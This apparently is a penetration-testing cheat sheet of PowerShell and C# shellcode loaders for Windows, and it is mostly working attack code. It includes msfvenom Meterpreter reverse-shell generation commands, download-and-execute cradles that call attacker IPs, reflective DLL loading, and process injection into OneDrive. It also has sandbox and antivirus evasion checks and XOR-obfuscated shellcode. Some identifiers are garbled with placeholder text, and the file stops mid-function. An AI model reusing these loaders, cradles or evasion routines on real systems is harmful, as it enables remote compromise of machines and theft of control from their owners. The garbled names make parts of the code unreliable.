#### Basic PowerShell Runner:

    //not great - creates temp files on disk due to Add-Type
    //Generate:
    msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.208 LPORT=443 EXITFUNC=thread -f ps1
    //Usage:
    powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.45.208/runner.txt') | IEX"

    ###########Runner (runner.txt/ps1):#############
    $Kernel32 = @"
    using System;
    using System.Runtime.InteropServices;
    public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
    "@
    Add-Type $Kernel32
    [Byte[]] $buf = 0xfc,0xe8,0x8f,.............................
    $size = $buf.Length
    [IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
    $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
    [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")

#### Basic PowerShell Runner #2:

    //slightly better - doesn't create temp files like #1
    //Generate:
    msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f ps1
    //to override proxy:  msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=8080 EXITFUNC=thread -f ps1

    //64bit (just different shellcode/listener):
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f ps1
    //to override proxy:  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=8080 EXITFUNC=thread -f ps1

    //To Invoke:
        powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.45.208/runner.txt') | IEX
        //Or:
            pwsh
            $text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.210/run.txt') | IEX"
            $bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
            $EncodedText = [Convert]::ToBase64String($bytes)
            $EncodedText
            cmd.exe /c powershell -ep bypass -enc .....

    ###########Runner (runner.txt):#############
    function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, 
    @($moduleName)), $functionName))
    }
    function getDelegateType {
    Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, [Parameter(Position = 1)] [Type] $delType = [Void])
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
    }
    $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
    [Byte[]] $buf = 0xfc,0xe8,0x8f,0x0,............................
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
    $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)

    ###########Win10 Version (run2_win10.txt):#############
    //Might need if Get-ProcAddress errors out

    Function potatoes
        {
            Param
            (
                [OutputType([IntPtr])]
                [Parameter( Position = 0, Mandatory = $True )]
                [String]
                $Module,
                [Parameter( Position = 1, Mandatory = $True )]
                [String]
                $Procedure
            )
            $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') };
            $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods');
            # Get a reference to the GetModuleHandle and GetProcAddress methods
            $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle');
            #Deal with the fact that windows now has two of these, we'll select the second one
            $x=$($UnsafeNativeMethods.GetMethods() | where-object {$_.name -eq "getprocaddress"});

            if(Get-Member -InputObject $x -Name Length -MemberType Properties) {
                write-host $x | format-table
                $GetProcAddress = $x[1];
            } else {
                $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
            }
                
            $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
            $tmpPtr = New-Object IntPtr
            $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
            return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
        }

    function apples {
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
    }
    $cucumbers = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll VirtualAlloc), (apples @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
    [Byte[]] $buf = 0xfc,0x48,0x83,0xe4,...................................
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $cucumbers, $buf.length)
    $parsnips =
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll CreateThread), (apples @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$cucumbers,[IntPtr]::Zero,0,[IntPtr]::Zero)
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll WaitForSingleObject), (apples @([IntPtr], [Int32]) ([Int]))).Invoke($parsnips, 0xFFFFFFFF)

#### Proxy-Aware PowerShell Download Cradle:

    //Defaults back to no proxy if the proxy doesn't work
    **Start 2 handlers w/ msf:  use multi/handler; set payload windows/meterpreter/reverse_https; set lhost tun0; set lport 443; run -j; set payload windows/meterpreter/reverse_https; set lhost tun0; set lport 8080; run -j

    ###########Cradle:#############
    New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
    $keys = Get-ChildItem 'HKU:\'
    ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
    $proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
    [system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
    $wc = new-object system.net.WebClient
    $wc.DownloadString("http://192.168.45.208/runner.txt")
    if (! $?) {$wc2 = new-object system.net.WebClient;$wc2.proxy = $null;$wc2.DownloadString('http://192.168.45.208/runnerNoProxy.txt'}

    #####One-liner Cradle:
    powershell New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null;$sid='*S-1-5-21-*';ForEach ($key in $(Get-ChildItem 'HKU:\')) {if ($key.Name -like $sid) {$start = $key.Name.substring(10);break}};$proxyAddr=(Get-ItemProperty -Path 'HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\').ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy('http://$proxyAddr');(new-object system.net.WebClient).DownloadString('http://192.168.45.208/runner.txt') | IEX;if (! $?) {$wc2 = new-object system.net.WebClient;$wc2.proxy = $null;$wc2.DownloadString('http://192.168.45.208/runnerNoProxy.txt')|IEX}

    //worked from cmd:
        powershell "New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null;ForEach ($key in $(Get-ChildItem 'HKU:\')) {if ($key.Name -like \"*S-1-5-21-*\") {$start = $key.Name.substring(10);break}};$proxyAddr=(Get-ItemProperty -Path \"HKU:$start\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\\").ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy(\"http://$proxyAddr\");(new-object system.net.WebClient).DownloadString('http://192.168.45.208/runner64.txt') | IEX"

    ///OR:
    $browser = New-Object System.Net.WebClient
    $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials

    ///OR:
    [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
    [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

    ###########Proxy Troubleshooting:#############
    Proxy Checking/Bypass:
        Net.WebClient is proxy aware (for now at least); Meterpreter is also proxy aware
            Meterpreter is fully proxy aware - both system settings/registry and netsh winhttp proxy
        Check if proxy will be used for a request (host/port):  [System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://192.168.45.208/runner.ps1")
        Bypass:
            $wc = new-object system.net.WebClient
            $wc.proxy = $null
            $wc.DownloadString("http://192.168.45.208/runner.ps1")
    Setting User-Agent:
        $wc = new-object system.net.WebClient
        $wc.Headers.Add('User-Agent', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36")
        $wc.DownloadString("http://192.168.45.208/runner.ps1")
    Using User's Proxy in SYSTEM Session:
        //Test:  PsExec.exe -s -i C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe; do the request and check access log
        Stored at:  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings - ProxyEnable; ProxyServer
        Map it as System:  New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
        ...
        //see proxy-aware PowerShell download cradle that works while SYSTEM - and can fallback to no proxy

#### PS Reflective Loading Runner:

    //injects into self
    // msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread PrependMigrate=true PrependMigrateProc=svchost.exe -f csharp

    //trigger: powershell [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://192.168.45.224/ClassLibrary1_32_thread.dll')).GetType('ClassLibrary1.Class1').GetMethod('runner').Invoke(0, $null)

    ###########Code:#############

    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Text;
    using System.Threading.Tasks;
    using System.Diagnostics;
    using System.Runtime.InteropServices;

    namespace ClassLibrary1
    {
        public class Class1
        {
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
        flAllocationType, uint flProtect);
            [DllImport("kernel32.dll")]
            static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
            [DllImport("kernel32.dll")]
            static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
        dwMilliseconds);
            public static void runner()
            {
                byte[] buf = new byte[1166] {0xfc,0xe8,0xc1,0x00,0x00,0x00,
    ..................
                int size = buf.Length;
                IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
                Marshal.Copy(buf, 0, addr, size);
                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0,
            IntPtr.Zero);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
    }
    }

#### PS Reflective Loading Injector:

    //injects into another process
    //trigger: powershell [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://192.168.45.224/ClassicProcessInjectorDLL.dll')).GetType('ClassicProcessInjectorDLL.MyClass').GetMethod('injector').Invoke(0, $null)

    ###########Injector Code:#############
    // msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a

    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;

    namespace ClassicProcessInjectorDLL
    {
        public class MyClass
        {
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll")]
            static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

            [DllImport("kernel32.dll")]
            static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            [DllImport("kernel32.dll")]
            static extern void Sleep(uint dwMilliseconds);

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

            [DllImport("kernel32.dll")]
            static extern IntPtr GetCurrentProcess();

            public static void injector()
            {
                // Check if we're in a sandbox by calling a rare-emulated API
                if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
                {
                    return;
                }

                // Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
                var rand = new Random();
                uint dream = (uint)rand.Next(10000, 20000);
                double delta = dream / 1000 - 0.5;
                DateTime before = DateTime.Now;
                Sleep(dream);
                if (DateTime.Now.Subtract(before).TotalSeconds < delta)
                {
                    Console.WriteLine("Charles, get the rifle out. We're being fucked.");
                    return;
                }
                //string processName = args[0];
                Process[] pList = Process.GetProcessesByName("OneDrive");
                if (pList.Length == 0)
                {
                    Console.WriteLine("[-] No such process!");
                    System.Environment.Exit(1);
                }
                int processId = pList[0].Id;
                // 0x001F0FFF = PROCESS_ALL_ACCESS
                IntPtr hProcess = OpenProcess(0x001F0FFF, false, processId);
                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

                // msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a
                byte[] buf = new byte[567] {0x9d,0x89,0xee,0x61,0x61,0x61,
    0x01,0x50,0xb3,0xe8,0x84,0x05,0xea,0x33,0x51,0xea,0x33,0x6d,
    ..........................................................;

                // XOR-decrypt the shellcode
                for (int i = 0; i < buf.Length; i++)
                {
                    buf[i] = (byte)(buf[i] ^ (byte)'a');
                }

                IntPtr outSize;
                WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            }
        }
    }



#### PowerShell DLL Reflective Injector (Classic Method):

    //32 bit - injects shellcode into OneDrive by default (or you can pick another 32bit)
    //Test from 32bit PowerShell
    //can be used in Macro

    msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a

    [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://192.168.45.224/ClassicProcessInjectorDLL.dll')).GetType('ClassicProcessInjectorDLL.MyClass').GetMethod('injector').Invoke(0, $null)

    ###########ClassicProcessInjectorDLL.dll hosted:###########
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.IO;
    using System.Net;

    namespace ClassicProcessInjectorDLL
    {
        public class MyClass
        {
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll")]
            static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

            [DllImport("kernel32.dll")]
            static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            [DllImport("kernel32.dll")]
            static extern void Sleep(uint dwMilliseconds);

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

            [DllImport("kernel32.dll")]
            static extern IntPtr GetCurrentProcess();
            [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr FlsAlloc(IntPtr callback);

            public static void injector()
            {
                // Check if we're in a sandbox by calling a rare-emulated API
                if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
                {
                    return;
                }

                //PE name check:
                //string exename = "BasicRunner";
                //if (Path.GetFileNameWithoutExtension(Environment.GetCommandLineArgs()[0]) != exename)
                //{
                //    Console.WriteLine(Path.GetFileNameWithoutExtension(Environment.GetCommandLineArgs()[0]));
                //    return;
                //}

                //Machine name check:
                if (Environment.MachineName != "DEVELOPMENT" && Environment.MachineName != "VICTIM")
                {
                    Console.WriteLine(Environment.MachineName);
                    return;
                }

                //Web request to fake domain check:
                try
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://sldkfjsdkfjdskfjsldkfjlsdjfyyue.com/");
                    HttpWebResponse res = (HttpWebResponse)req.GetResponse();
                    if (res.StatusCode == HttpStatusCode.OK)
                    {
                        return;
                    }
                }
                catch (WebException we)
                {
                    Console.WriteLine("\r\nWeb Exception as Expected. Error: {0}", we.Status);
                }

                //Another emulated API check:
                IntPtr ptrCheck = FlsAlloc(IntPtr.Zero);
                if (ptrCheck == null)
                {
                    return;
                }

                // Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
                var rand = new Random();
                uint dream = (uint)rand.Next(10000, 20000);
                double delta = dream / 1000 - 0.5;
                DateTime before = DateTime.Now;
                Sleep(dream);
                if (DateTime.Now.Subtract(before).TotalSeconds < delta)
                {
                    Console.WriteLine("Charles, get the rifle out. We're being fucked.");
                    return;
                }
                //string processName = args[0];
                Process[] pList = Process.GetProcessesByName("OneDrive");
                if (pList.Length == 0)
                {
                    Console.WriteLine("[-] No such process!");
                    System.Environment.Exit(1);
                }
                int processId = pList[0].Id;
                // 0x001F0FFF = PROCESS_ALL_ACCESS
                IntPtr hProcess = OpenProcess(0x001F0FFF, false, processId);
                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

                // msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a
                byte[] buf = new byte[567] {0x9d,0x89,0xee,0x61,0x61,0x61,
    0x01,0x50,0xb3,0xe8,0x84,0x05,0xea,0x33,0x51,0xea,0x33,0x6d,
    ..............................................

                // XOR-decrypt the shellcode
                for (int i = 0; i < buf.Length; i++)
                {
                    buf[i] = (byte)(buf[i] ^ (byte)'a');
                }

                IntPtr outSize;
                WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            }
        }
    }

#### PowerShell DLL Reflective Injector (NTAPI Method):

    //NTAPI Method only works manually / from 64bit processes (no macro)

    // msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a

    [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://192.168.45.224/NtProcessInjectorDLL.dll')).GetType('NtProcessInjectorDLL.MyClass').GetMethod('injector').Invoke(0, $null)

    ###########Hosted NtProcessInjectorDLL.dll:###########
    using System;
    using System.Linq;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Collections.Generic;
    using System.Text;
    using System.Threading.Tasks;
    using System.IO;
    using System.Net;

    namespace NtProcessInjectorDLL
    {
        public class MyClass
        {
            public const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
            public const uint SECTION_MAP_READ = 0x0004;
            public const uint SECTION_MAP_WRITE = 0x0002;
            public const uint SECTION_MAP_EXECUTE = 0x0008;
            public const uint PAGE_READ_WRITE = 0x04;
            public const uint PAGE_READ_EXECUTE = 0x20;
            public const uint PAGE_EXECUTE_READWRITE = 0x40;
            public const uint SEC_COMMIT = 0x8000000;

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

            [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
            static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

            [DllImport("ntdll.dll", SetLastError = true)]
            static extern uint NtMaPView_%hName%OfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

            [DllImport("ntdll.dll", SetLastError = true)]
            static extern uint NtUnmaPView_%hName%OfSection(IntPtr hProc, IntPtr baseAddr);

            [DllImport("ntdll.dll", SetLastError = true)]
            static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, IntPtr clientId);

            [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
            static extern int NtClose(IntPtr hObject);

            [DllImport("kernel32.dll")]
            static extern void Sleep(uint dwMilliseconds);

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

            [DllImport("kernel32.dll")]
            static extern IntPtr GetCurrentProcess();

            // BEGIN DEBUG (imports)
            [DllImport("kernel32.dll", SetLastError = true)]
            static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

            [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
            static extern int memcmp(byte[] b1, byte[] b2, UIntPtr count);
            [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr FlsAlloc(IntPtr callback);

            static bool CompareByteArray(byte[] b1, byte[] b2)
            {
                return b1.Length == b2.Length && memcmp(b1, b2, (UIntPtr)b1.Length) == 0;
            }
            // END DEBUG

            public static void injector()
            {
                // Check if we're in a sandbox by calling a rare-emulated API
                if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
                {
                    return;
                }

                //PE name check:
                //string exename = "BasicRunner";
                //if (Path.GetFileNameWithoutExtension(Environment.GetCommandLineArgs()[0]) != exename)
                //{
                //    Console.WriteLine(Path.GetFileNameWithoutExtension(Environment.GetCommandLineArgs()[0]));
                //    return;
                //}

                //Machine name check:
                if (Environment.MachineName != "DEVELOPMENT" && Environment.MachineName != "VICTIM")
                {
                    Console.WriteLine(Environment.MachineName);
                    return;
                }

                //Web request to fake domain check:
                try
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://sldkfjsdkfjdskfjsldkfjlsdjfyyue.com/");
                    HttpWebResponse res = (HttpWebResponse)req.GetResponse();
                    if (res.StatusCode == HttpStatusCode.OK)
                    {
                        return;
                    }
                }
                catch (WebException we)
                {
                    Console.WriteLine("\r\nWeb Exception as Expected. Error: {0}", we.Status);
                }

                //Another emulated API check:
                IntPtr ptrCheck = FlsAlloc(IntPtr.Zero);
                if (ptrCheck == null)
                {
                    return;
                }

                // Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
                var rand = new Random();
                uint dream = (uint)rand.Next(10000, 20000);
                double delta = dream / 1000 - 0.5;
                DateTime before = DateTime.Now;
                Sleep(dream);
                if (DateTime.Now.Subtract(before).TotalSeconds < delta)
                {
                    Console.WriteLine("Charles, get the rifle out. We're being fucked.");
                    return;
                }

                // msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a
                byte[] buf = new byte[567] {0x9d,0x89,0xee,0x61,0x61,0x61,
    0x01,0x50,0xb3,0xe8,0x84,0x05,0xea,0x33,0x51,0xea,0x33,0x6d,
    ................................................

                // XOR-decrypt the shellcode
                for (int i = 0; i < buf.Length; i++)
                {
                    buf[i] = (byte)(buf[i] ^ (byte)'a');
                }

                int bufLength = buf.Length;
                UInt32 uBufLength = (UInt32)bufLength;

                // Get handle on a local process
                IntPtr hLocalProcess = Process.GetCurrentProcess().Handle;

                // Get handle on a remote process (by name)
                Process[] pList = Process.GetProcessesByName("OneDrive");
                if (pList.Length == 0)
                {
                    Console.WriteLine("[-] No such process");
                    return;
                }
                int processId = pList.First().Id;
                IntPtr hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
                if (hRemoteProcess == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to open remote process");
                    return;
                }

                // Create RWX memory section for the shellcode
                IntPtr hSection = new IntPtr();
                if (NtCreateSection(ref hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, IntPtr.Zero, ref uBufLength, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero) != 0)
                {
                    Console.WriteLine("[-] Failed to create a section for the shellcode");
                    return;
                }

                // Map the view of created section into the LOCAL process's virtual address space (as R-W)
                IntPtr baseAddressL = new IntPtr();
                ulong sectionOffsetL = new ulong();
                if (NtMaPView_%hName%OfSection(hSection, hLocalProcess, ref baseAddressL, UIntPtr.Zero, UIntPtr.Zero, out sectionOffsetL, out uBufLength, 2, 0, PAGE_READ_WRITE) != 0)
                {
                    Console.WriteLine("[-] Failed to map the view into local process's space");
                    return;
                }

                // Map the view of (the same) created section into the REMOTE process's virtual address space (as R-E)
                IntPtr baseAddressR = new IntPtr();
                ulong sectionOffsetR = new ulong();
                if (NtMaPView_%hName%OfSection(hSection, hRemoteProcess, ref baseAddressR, UIntPtr.Zero, UIntPtr.Zero, out sectionOffsetR, out uBufLength, 2, 0, PAGE_READ_EXECUTE) != 0)
                {
                    Console.WriteLine("[-] Failed to map the view into remote process's space");
                    return;
                }

                // Copy the shellcode into the locally mapped view which will be reflected on the remotely mapped view
                Marshal.Copy(buf, 0, baseAddressL, bufLength);

                // BEGIN DEBUG (check if the shellcode was copied correctly)
                byte[] remoteMemory = new byte[bufLength];
                IntPtr bytesRead = new IntPtr();
                ReadProcessMemory(hRemoteProcess, baseAddressR, remoteMemory, remoteMemory.Length, out bytesRead);
                if (!CompareByteArray(buf, remoteMemory))
                {
                    Console.WriteLine("[-] DEBUG: Shellcode bytes read from remotely mapped view do not match with local buf");
                    return;
                }
                // END DEBUG

                // Execute the shellcode in a remote thread (also can be done with CreateRemoteThread)
